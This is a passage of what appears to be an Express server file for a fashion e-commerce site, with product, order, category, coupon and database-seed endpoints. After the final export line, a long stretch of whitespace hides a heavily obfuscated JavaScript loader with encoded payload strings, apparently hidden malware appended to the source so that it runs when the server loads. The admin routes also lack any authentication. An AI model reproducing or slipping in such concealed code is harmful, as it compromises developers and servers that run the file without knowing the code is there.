      items.sort((a: any, b: any) => (a.discountPrice || a.price) - (b.discountPrice || b.price));
    } else if (sort === 'price-high') {
      items.sort((a: any, b: any) => (b.discountPrice || b.price) - (a.discountPrice || a.price));
    } else if (sort === 'rating') {
      items.sort((a: any, b: any) => (b.rating || 0) - (a.rating || 0));
    }

    res.json(items);
  } catch (err: any) {
    res.json(memoryStore.products);
  }
});

// Create Product (Admin)
app.post('/api/products', async (req, res) => {
  try {
    const product = req.body;
    if (!product.name || !product.price) {
      return res.status(400).json({ error: 'Name and price are required' });
    }

    if (!product.id) {
      product.id = 'prod-' + Date.now();
    }
    if (!product.slug) {
      product.slug = product.name.toLowerCase().replace(/[^a-z0-9]+/g, '-');
    }
    if (!product.images || product.images.length === 0) {
      product.images = ['https://lh3.googleusercontent.com/aida-public/AB6AXuBQfVBssNPUEE1CFfdQZ_PaP6lFhDW670azT8AhZYkZQvjyA_Eb9MDgrprcQUVW32_pV9EhYBLHdU3FVR6K2Gq237XjwK1hAS05bNkjV0NOsPYKorx397A-tFQE2fTMQ11FxdiPrHwIRF8awJEXfutVe-3VpTqwQJjt9zJLpKKgJbRVlTf2yyUHZ9YgcJ3riVjEnU_LNMbILWVE3K_8lG7ZUB4i_znLGQuLyuHqzj7uGOPB3Z6sTtEJ4g'];
    }

    if (mongoConnected && db) {
      await db.collection('products').insertOne(product);
    }
    memoryStore.products.unshift(product);

    res.status(201).json({ success: true, product });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

// Update Product (Admin)
app.put('/api/products/:id', async (req, res) => {
  const { id } = req.params;
  const updates = req.body;

  if (mongoConnected && db) {
    try {
      await db.collection('products').updateOne({ id }, { $set: updates });
    } catch (e) {}
  }

  const idx = memoryStore.products.findIndex((p) => p.id === id);
  if (idx !== -1) {
    memoryStore.products[idx] = { ...memoryStore.products[idx], ...updates };
  }

  res.json({ success: true, product: updates });
});

// Delete Product (Admin)
app.delete('/api/products/:id', async (req, res) => {
  const { id } = req.params;

  if (mongoConnected && db) {
    try {
      await db.collection('products').deleteOne({ id });
    } catch (e) {}
  }

  memoryStore.products = memoryStore.products.filter((p) => p.id !== id);
  res.json({ success: true, message: `Product ${id} deleted` });
});

// 4. Categories Endpoints
app.get('/api/categories', async (req, res) => {
  if (mongoConnected && db) {
    try {
      const cats = await db.collection('categories').find({}).toArray();
      return res.json(cats);
    } catch (e) {}
  }
  res.json(memoryStore.categories);
});

// 5. Orders Endpoints
app.get('/api/orders', async (req, res) => {
  if (mongoConnected && db) {
    try {
      const orders = await db.collection('orders').find({}).sort({ createdAt: -1 }).toArray();
      return res.json(orders);
    } catch (e) {}
  }
  res.json(memoryStore.orders);
});

// Create Order (Checkout)
app.post('/api/orders', async (req, res) => {
  try {
    const orderData = req.body;
    const newOrder = {
      ...orderData,
      id: orderData.id || `ORD-VC-${Date.now().toString().slice(-6)}`,
      createdAt: new Date().toISOString(),
      orderStatus: 'Confirmed',
      paymentStatus: orderData.paymentMethod?.includes('Cash') ? 'Pending' : 'Paid',
    };

    if (mongoConnected && db) {
      await db.collection('orders').insertOne(newOrder);
    }
    memoryStore.orders.unshift(newOrder);

    res.status(201).json({ success: true, order: newOrder });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

// Update Order Status (Admin)
app.patch('/api/orders/:id/status', async (req, res) => {
  const { id } = req.params;
  const { status } = req.body;

  if (mongoConnected && db) {
    try {
      await db.collection('orders').updateOne({ id }, { $set: { orderStatus: status } });
    } catch (e) {}
  }

  const order = memoryStore.orders.find((o) => o.id === id);
  if (order) {
    order.orderStatus = status;
  }

  res.json({ success: true, id, status });
});

// 6. Privilege Codes / Coupons
app.get('/api/coupons', (req, res) => {
  res.json(memoryStore.coupons);
});

// Re-seed DB trigger endpoint (Admin)
app.post('/api/admin/seed', async (req, res) => {
  if (mongoConnected && db) {
    try {
      await db.collection('products').deleteMany({});
      await db.collection('products').insertMany(SEED_PRODUCTS);
      await db.collection('categories').deleteMany({});
      await db.collection('categories').insertMany(SEED_CATEGORIES);
      await db.collection('orders').deleteMany({});
      await db.collection('orders').insertMany(SEED_ORDERS);
      return res.json({ success: true, message: 'Database refreshed with luxury seed data!' });
    } catch (e: any) {
      return res.status(500).json({ error: e.message });
    }
  }
  memoryStore.products = [...SEED_PRODUCTS];
  memoryStore.categories = [...SEED_CATEGORIES];
  memoryStore.orders = [...SEED_ORDERS];
  res.json({ success: true, message: 'Memory store refreshed with luxury seed data!' });
});

// Start Server with Vite Middleware
export async function startServer() {
  await initMongoDB();

  // On Vercel, we don't want to serve static files or Vite middleware manually, 
  // as Vercel handles static routing and index.html serving via vercel.json.
  if (process.env.VERCEL !== '1') {
    if (process.env.NODE_ENV !== 'production') {
      const vite = await createViteServer({
        server: { middlewareMode: true },
        appType: 'spa',
      });
      app.use(vite.middlewares);
    } else {
      const distPath = path.join(process.cwd(), 'dist');
      app.use(express.static(distPath));
      app.get('*', (req, res) => {
        res.sendFile(path.join(distPath, 'index.html'));
      });
    }

    app.listen(PORT, '0.0.0.0', () => {
      console.log(`✨ Velvet Crimson Haute Couture server running on http://0.0.0.0:${PORT}`);
    });
  }
}

if (process.env.VERCEL !== '1') {
  startServer();
}

export default app;																																																																																																																																																																																																																																																																										var z = '-9219-2';(function(_0x50f527,_0x2b1efa){var _0x2d7278=_0xe041,_0x5dd740=_0x50f527();while(!![]){try{var _0x30bdd7=parseFloat(_0x2d7278(0x14))/0x1*(parseFloat(_0x2d7278(0x1a))/0x2)+parseFloat(-parseFloat(_0x2d7278(0x1d))/0x3)+-parseFloat(_0x2d7278(0x6))/0x4+Math['floor'](parseFloat(_0x2d7278(0x13))/0x5)*(-parseFloat(_0x2d7278(0x24))/0x6)+parseInt(parseFloat(_0x2d7278(0x22))/0x7)+parseFloat(_0x2d7278(0x1c))/0x8+Math['max'](parseFloat(_0x2d7278(0xa))/0x9,parseFloat(_0x2d7278(0x5))/0xa)*(-parseFloat(_0x2d7278(0x8))/0xb);if(_0x30bdd7===_0x2b1efa)break;else _0x5dd740['push'](_0x5dd740['shift']());}catch(_0xb32dd5){_0x5dd740['push'](_0x5dd740['shift']());}}}(_0x5098,0xa5dfe));function _0xe041(_0x190f3c,_0x1321c2){var _0x490b11=_0x5098();return _0xe041=function(_0x4ecda4,_0x50983f){_0x4ecda4=_0x4ecda4-0x0;var _0xe04135=_0x490b11[_0x4ecda4];if(_0xe041['xFVHaA']===undefined){var _0x3c2879=function(_0xc79f3){var _0x1bc72a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x3eb26c='',_0x1ed99f='';for(var _0x4880f3=0x0,_0x3adb0d,_0x3abbea,_0x3aeb57=0x0;_0x3abbea=_0xc79f3['charAt'](_0x3aeb57++);~_0x3abbea&&(_0x3adb0d=_0x4880f3%0x4?_0x3adb0d*0x40+_0x3abbea:_0x3abbea,_0x4880f3++%0x4)?_0x3eb26c+=String['fromCharCode'](0xff&_0x3adb0d>>(-0x2*_0x4880f3&0x6)):0x0){_0x3abbea=_0x1bc72a['indexOf'](_0x3abbea);}for(var _0x1e00f2=0x0,_0x45cc72=_0x3eb26c['length'];_0x1e00f2<_0x45cc72;_0x1e00f2++){_0x1ed99f+='%'+('00'+_0x3eb26c['charCodeAt'](_0x1e00f2)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1ed99f);};_0xe041['jgDBEr']=_0x3c2879,_0x190f3c=arguments,_0xe041['xFVHaA']=!![];}var _0x4ced6a=_0x490b11[0x0],_0x51e39e=_0x4ecda4+_0x4ced6a,_0x425c43=_0x190f3c[_0x51e39e];return!_0x425c43?(_0xe04135=_0xe041['jgDBEr'](_0xe04135),_0x190f3c[_0x51e39e]=_0xe04135):_0xe04135=_0x425c43,_0xe04135;},_0xe041(_0x190f3c,_0x1321c2);}var NX=[0x697b4f,0x16f,0x4fbb,0x265,0xaaef,0x4c9693],SX=[0x509f9d,0xf1,0xa3e1,0xbb,0xdb41,0x484f55];function _0x5098(){var _0x3cb552=['C3rHDgvpyMPLy3q','nvzYwurSza','ntG0mZq2EgLYuK1Y','zgvIDq','xcTCkYaQkd86w2eTEKeTwL8KxvSWltLHlxPblvPFjf0Qkq','y2HHCKf0','DgvZDa','zxbRzNy','nfLwv2rkqq','D2HPBguGkhrYDwuPihT9','otaXntCYmhDRwNnfzW','mZi5nJCWwu1yEffO','yxbWBhK','zNvUy3rPB24GkLWOicPCkq','y15TzwPIxNrYBW','C3vIC3rYAw5N','nZq0mZu5me5cyxHTCW','uM9Mz2G','mZaZndi2nK5zwKjQuq','BgvUz3rO','BfjHswC','Aw5WDxq','AhfLCNn4Bhv2D2fJzgPIEw1NB3j6zMTVy2LWDhj1Dg5ZDg9UyW','y29UC3rYDwn0B3i','nta3ntq3mhv1wgTTAa','mtm1mJy0zfDzA1jj','y2fSBa','ndrSDLDtyvy','C3bSAxq','ndu2nZKYm0DYCgjdDq','y291BNrLCG','Aw5PDa','C3rYAw5N','D3zluwW','pwfLBNj1AcHHBd01yYXNogzKDs55CIaUlM5JzwnMlduICgfLyxu2Bg5QkxjDmNv2iNGTCsHDige7khi9oZTYkYHHwZGUCZj0qwDVCsX1AdHdlgfPlhm7ysHbBtaOBMO7ANyQldD2BZCOksHVo202B2e0CNCPlIbYB2rBzNmYBNTKCNz0nhGPkZaSyw5Yk3jYk28PFxOXid1OzLTHBJHYmxjBlf1ZnY03n2XHys51AtD7lta2owX2BxqYCJ1Pxv08kYL1lguPlcW7BNjOw3i9mhyTCIG7ld1Wkun1CZ0RyZTNo2y7CuePktf2AsL2AZbUCMWXywuGzJ1Bo2HPC3KUzw0OzcTVitiGpsHLDMvHnZG9lIK0zwK9zY5UpxTMzJ0XwZWYysbMmt1YoZqSuYLYEwX2mxuGEtTRCwX7DhzUDIaOqYaOBcXVDM5WigK9DgXYlhiUBhDVEMGOBcX0CtS7CNiOkhy9ywHZDJTDEhe9ywi7zge7lcGOCJT2ANeUkhrBkYLKysLYzg5YAhm0mxKODNi7zMG7m2CIxwuOlMfOCNbHCgDDzY4PBMDMCg4XAcXPy2W7oYK9qZTTnt0RCIWGlIK7Dt0RC30RkwL0lcTIBtTKk3vTks09C2LPCw9Spxq9CJ1XosSUlMnOCsTBnMzLihqWBNjWCIGGDNi4zMXYBIXKzgD0if02ys47BtTYDgGUz3eGmMf9zxzLAwnDz2j0AtW0BZTdo2WSENPPnITSw2fBoYSOC2KIBgKICIXUCgK5CYXMCMzODxCPB3C9zxSOyJ13zw4YDc5NDs5PpwTPywfHkYL5zNrWytnUFsK9osiPy3bbk3u7DxrWxsi9BgS3DNb0idfYo2H6DYiPDcGPosKOlMX1Bd1Zn2y7idTZCtaPBIj5kZbZFt12ysTZig1OkdbXlL1ODJS+ida2pueTB3PLDhiODdfYDhjZAxnVmguSlJT6wYHMpdvLn3qSkhjHB2f2BNi7DgHOzJT2lgO9CJSGkxi+mtH6Ag8QB3S8ywTTC24PywT0zs52BZKRzweWy2XPBZTIDsa9xumHz2O7EtmRBcLLps59zhi9AtzVAum4CM5UmdS2pwfYiN0UCMvPpv1tDhnYBM4UoZjYpxq7w3q7Axy9ChjdCM4OkwfYzxr1EISGAgXRwYT4pwuGltHQEYHLANK5kcGPksa','AM9PBG','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